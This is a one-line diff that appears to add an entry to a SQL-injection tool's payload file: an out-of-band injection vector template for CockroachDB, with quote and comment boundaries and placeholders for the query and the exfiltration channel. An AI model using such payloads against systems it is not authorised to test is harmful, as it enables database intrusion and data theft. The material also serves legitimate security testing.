@@ -1,0 +1,1 @@
+{"dbms": "cockroachdb", "technique": "oob", "boundary": {"prefix": "'", "suffix": "-- -", "type": "single"}, "vector": "{B} AND 1=(SELECT ({Q}))/*OOB {OOB}*/", "comment": "cockroachdb oob: single, inline comment"}
